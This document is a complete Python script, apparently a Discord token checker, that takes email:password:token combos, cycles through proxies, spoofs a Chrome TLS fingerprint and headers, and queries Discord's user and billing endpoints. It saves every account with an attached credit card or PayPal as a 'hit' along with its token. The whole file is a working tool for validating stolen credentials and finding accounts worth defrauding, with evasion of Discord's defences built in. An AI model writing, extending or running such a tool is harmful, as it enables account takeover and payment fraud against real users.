import tls_client
import asyncio
import random
import json
import os
from itertools import cycle
from typing import Dict, Optional, List
from datetime import datetime
import argparse
from pathlib import Path
import base64
import aiofiles
from colorama import Fore, init

class ProxyManager:
    def __init__(self, proxy_file='input/proxies.txt'):
        self.proxies = self.load_proxies(proxy_file)
        self.proxy_cycle = cycle(self.proxies)
        self.lock = asyncio.Lock()
        
    def load_proxies(self, file):
        try:
            with open(file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Proxy file not found")
            return []
            
    async def get_next_proxy(self):
        async with self.lock:
            return next(self.proxy_cycle) if self.proxies else None

class ResultManager:
    def __init__(self):
        self.timestamp = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
        self.output_dir = Path(f"output/{self.timestamp}")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.hits_file = self.output_dir / "hits.txt"
        self.lock = asyncio.Lock()
        
    async def save_hit(self, data: Dict):
        content = (
            f"====================\n"
            f"Email: {data['email']}\n"
            f"Username: {data['username']}\n"
            f"ID: {data['id']}\n"
            f"Token: {data['token']}\n"
            f"Payment Methods:\n"
        )
        
        for method in data['payment_methods']:
            content += f"- {method}\n"
        
        content += f"Checked at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n====================\n\n"
        
        async with self.lock:
            async with aiofiles.open(self.hits_file, 'a', encoding='utf-8') as f:
                await f.write(content)
                await f.flush()

class TLSDiscordClient:
    def __init__(self):
        self.super_properties = {
            "os": "Windows",
            "browser": "Chrome",
            "device": "",
            "system_locale": "en-US",
            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "browser_version": "120.0.0.0",
            "os_version": "10",
            "referrer": "",
            "referring_domain": "",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": 242536,
            "client_event_source": None
        }
        self._session = None
        
    def _get_headers(self, token: str) -> dict:
        return {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Authorization': token,
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me',
            'User-Agent': self.super_properties['browser_user_agent'],
            'X-Super-Properties': base64.b64encode(json.dumps(self.super_properties).encode()).decode('utf-8')
        }

    def create_session(self, proxy: Optional[str] = None):
        if self._session is None:
            self._session = tls_client.Session(
                client_identifier="chrome_120",
                random_tls_extension_order=True
            )
            
            if proxy:
                if '@' in proxy:
                    auth, proxy_addr = proxy.split('@')
                    user, pwd = auth.split(':')
                    self._session.proxies = {
                        "http": f"http://{user}:{pwd}@{proxy_addr}",
                        "https": f"http://{user}:{pwd}@{proxy_addr}"
                    }
                else:
                    self._session.proxies = {
                        "http": f"http://{proxy}",
                        "https": f"http://{proxy}"
                    }
        
        return self._session

async def check_account(token_data: Dict[str, str], proxy: str, result_manager: ResultManager, thread_id: int):
    client = TLSDiscordClient()
    headers = client._get_headers(token_data['token'])
    
    try:
        session = client.create_session(proxy)
        await asyncio.sleep(random.uniform(0.2, 0.5))
        
        user_future = asyncio.create_task(asyncio.to_thread(
            session.get,
            'https://discord.com/api/v9/users/@me',
            headers=headers
        ))
        
        billing_future = asyncio.create_task(asyncio.to_thread(
            session.get,
            'https://discord.com/api/v9/users/@me/billing/payment-sources',
            headers=headers
        ))
        
        response, billing_response = await asyncio.gather(user_future, billing_future)
        
        if response.status_code == 200:
            user_data = response.json()
            if billing_response.status_code == 200:
                payment_methods = billing_response.json()
                if payment_methods:
                    print(f"[Thread {thread_id}] {Fore.GREEN}{token_data['email']} | {user_data.get('username')} | {user_data.get('id')} | Payment Method Found{Fore.RESET}")
                    methods = ["Credit Card" if method.get('type') == 1 else "PayPal" for method in payment_methods]
                    await result_manager.save_hit({
                        'email': token_data['email'],
                        'username': user_data.get('username'),
                        'id': user_data.get('id'),
                        'token': token_data['token'],
                        'payment_methods': methods
                    })
                else:
                    print(f"[Thread {thread_id}] {Fore.RED}{token_data['email']} | {user_data.get('username')} | {user_data.get('id')} | No Payment Method{Fore.RESET}")
            else:
                print(f"[Thread {thread_id}] {Fore.RED}{token_data['email']} | {user_data.get('username')} | {user_data.get('id')} | Billing Check Failed{Fore.RESET}")
        else:
            print(f"[Thread {thread_id}] {Fore.RED}{token_data['email']} | Invalid Token{Fore.RESET}")
                
    except Exception as e:
        print(f"[Thread {thread_id}] {Fore.RED}{token_data['email']} | Connection Error{Fore.RESET}")
        
    await asyncio.sleep(random.uniform(0.5, 1))

async def process_single_token(token_data: Dict, proxy_manager: ProxyManager, result_manager: ResultManager, semaphore: asyncio.Semaphore, thread_id: int):
    async with semaphore:
        proxy = await proxy_manager.get_next_proxy()
        if proxy:
            await check_account(token_data, proxy, result_manager, thread_id)

async def process_tokens(tokens: List[Dict], proxy_manager: ProxyManager, result_manager: ResultManager, semaphore: asyncio.Semaphore):
    tasks = []
    for i, token_data in enumerate(tokens):
        thread_id = (i % semaphore._value) + 1
        tasks.append(
            asyncio.create_task(
                process_single_token(token_data, proxy_manager, result_manager, semaphore, thread_id)
            )
        )
    await asyncio.gather(*tasks)

async def main():
    parser = argparse.ArgumentParser(description='Multi-threaded Discord Token Checker with TLS Spoofing')
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads')
    args = parser.parse_args()

    try:
        proxy_manager = ProxyManager()
        result_manager = ResultManager()
        
        if not proxy_manager.proxies:
            print("No proxies loaded! Exiting...")
            return
            
        async with aiofiles.open('input/input.txt', 'r') as f:
            content = await f.read()
            lines = content.splitlines()
            
        valid_tokens = []
        for line in lines:
            parts = line.strip().split(':')
            if len(parts) >= 3:
                valid_tokens.append({
                    'email': parts[0],
                    'password': parts[1],
                    'token': parts[-1]
                })
            elif line.strip():
                valid_tokens.append({
                    'email': 'Unknown',
                    'password': 'Unknown',
                    'token': line.strip()
                })
        
        print(f"Loaded {len(valid_tokens)} tokens")
        print(f"Using {args.threads} threads")
        print(f"Output directory: {result_manager.output_dir}")
        
        semaphore = asyncio.Semaphore(args.threads)
        await process_tokens(valid_tokens, proxy_manager, result_manager, semaphore)
                
    except FileNotFoundError:
        print("input.txt file not found")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    asyncio.run(main())
